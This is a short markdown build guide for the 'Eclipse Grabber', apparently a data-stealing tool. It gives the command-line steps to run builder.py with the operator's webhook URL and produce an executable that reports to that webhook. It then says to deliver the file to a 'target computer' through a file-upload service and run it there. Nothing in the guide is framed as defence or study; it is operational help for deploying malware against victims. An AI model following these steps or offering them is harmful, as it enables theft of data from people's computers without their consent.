# Build Guide for the Eclipse Grabber
## Run the builder.py Script

To build an eclipse grabber you will need the webhook url from the webhook that we created earlier.
To access it, head over to your new server's settings and click on the **"Intergrations"** tab. Then click on the **"Webhooks"** tab.

![image](https://imgur.com/fEIbIfb.png)

To Execute the builder.py script, you need to run the following command:

### Windows
```
.\venv\Scripts\python.exe builder.py -w YOUR_WEBHOOK_URL -o FILE_NAME
```
### MacOS
```
sudo python3 builder.py -w YOUR_WEBHOOK_URL -o FILE_NAME
```
### Linux
```
sudo python3 builder.py -w YOUR_WEBHOOK_URL -o FILE_NAME
```
Make sure you replace the **YOUR_WEBHOOK_URL** with the webhook url you copied earlier and replace **FILE_NAME** with the name you want to give your executable file.

Once the builder is done, you will find your file in the **dist** directory.

## Execute built Eclipse Grabber

Now that you have the Executable file you can share it with the target coputer and run it. You can use a file uploading service like [this](https://file.io) one to **upload/download** the file to the computer.
